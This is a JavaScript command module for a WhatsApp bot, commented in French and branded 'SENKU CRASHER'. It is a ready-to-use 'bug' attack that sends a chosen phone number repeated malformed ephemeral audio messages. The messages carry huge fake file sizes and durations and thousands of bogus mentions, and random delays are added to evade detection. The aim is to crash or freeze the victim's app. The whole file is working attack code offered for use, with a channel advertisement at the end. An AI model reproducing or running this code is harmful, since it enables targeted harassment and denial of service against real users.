export const name = "delay";

export async function execute(sock, msg, args) {
    try {
        const from = msg.key.remoteJid;

        // Récupération de la cible
        let targetJid;
        if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            targetJid = msg.message.extendedTextMessage.contextInfo.participant;
        }
        else if (args.length > 0) {
            const input = args[0].replace(/^@/, '').replace(/[^0-9]/g, '');
            targetJid = input + "@s.whatsapp.net";
        }
        else {
            await sock.sendMessage(from, {
                text: "❌ Indique la cible !\nExemple : .bug @23769XXXXXX\nou réponds à un message"
            }, { quoted: msg });
            return;
        }

        // Message de début
        await sock.sendMessage(from, {
            text: `🔥 Tentative de bug sur ${targetJid.split('@')[0]}...`
        }, { quoted: msg });

        const ATTEMPTS = 15; // ← À ajuster (très risqué au-delà de 10-12 en 2026)

        for (let i = 0; i < ATTEMPTS; i++) {
            await sendBugPacket(sock, targetJid);
            // Délai aléatoire pour tenter d'être moins détectable
            await new Promise(r => setTimeout(r, 800 + Math.random() * 700));
        }

        // Message de fin + pub channel (version intégrée sans import)
        await sendChannelAd(sock, msg, targetJid, ATTEMPTS);

    } catch (err) {
        console.error("Erreur commande bug :", err?.message || err);

        await sock.sendMessage(from, {
            text: `❌ Erreur pendant l'envoi du bug :\n${err?.message || "Erreur inconnue"}`
        }, { quoted: msg });
    }
}

// ────────────────────────────────────────────────────────────────
//                     ENVOI DU PAQUET BUG
// ────────────────────────────────────────────────────────────────
async function sendBugPacket(sock, targetJid) {
    const fakeMentions = Array.from({ length: 6000 }, () => 
        `1${Math.floor(Math.random() * 9000000 + 1000000)}@s.whatsapp.net`
    );

    const mentionedJids = [
        "13135550002@s.whatsapp.net",
        ...fakeMentions
    ];

    const contextInfo = {
        mentionedJid: mentionedJids,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "SENKU CRASHER"
        }
    };

    const audioMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
        fileLength: "99999999999999",
        seconds: 99999999999999,
        ptt: true,
        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
        fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
        directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
        mediaKeyTimestamp: 99999999999999,
        contextInfo: contextInfo,
        waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
    };

    const content = {
        ephemeralMessage: {
            message: {
                audioMessage
            }
        }
    };

    const msgGenerated = sock.generateWAMessageFromContent(targetJid, content, {
        userJid: targetJid
    });

    const relayOptions = {
        messageId: msgGenerated.key.id,
        statusJidList: [targetJid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
            }]
        }]
    };

    await sock.relayMessage("status@broadcast", msgGenerated.message, relayOptions);
}

// ────────────────────────────────────────────────────────────────
//          MESSAGE DE FIN + PUB CHANNEL (intégrée)
// ────────────────────────────────────────────────────────────────
async function sendChannelAd(sock, originalMsg, targetJid, attempts) {
    const from = originalMsg.key.remoteJid;
    
    // Numéro d'image à utiliser (1.png, 2.png, 3.png, 4.png, etc...)
    const imageNumber = 4;

    // On suppose que les fichiers sont dans le dossier courant ou un dossier images/
    // → adapte le chemin selon ta structure réelle
    const imagePath = `\( {imageNumber}.png`; // ← ou `./images/ \){imageNumber}.png`

    let thumbBuffer = null;
    try {
        thumbBuffer = await sock.downloadMediaMessage({
            url: imagePath,
            directPath: imagePath
        }); // ← tentative si c'est un chemin local
    } catch (e) {
        // Si échec → on continue sans thumbnail (pas de crash)
        console.log("Thumbnail non chargé :", e.message);
    }

    await sock.sendMessage(from, {
        image: { url: imagePath },
        caption: `> Bug envoyé ! \( {attempts} paquets vers \){targetJid.split('@')[0]}\nRésultat non garanti (WhatsApp 2026)`,
        contextInfo: {
            externalAdReply: {
                title: "Rejoins notre Channel WhatsApp",
                body: "𝙎𝙀𝙉𝙆𝙐 𝙏𝙀𝘾𝙃",
                mediaType: 1,
                thumbnail: thumbBuffer || undefined,
                renderLargerThumbnail: false,
                mediaUrl: "https://whatsapp.com/channel/0029Vb5SsZ49RZAgIU7dkJ0V",
                sourceUrl: "https://whatsapp.com/channel/0029Vb5SsZ49RZAgIU7dkJ0V",
                thumbnailUrl: "https://whatsapp.com/channel/0029Vb5SsZ49RZAgIU7dkJ0V"
            }
        }
    }, { quoted: originalMsg });
}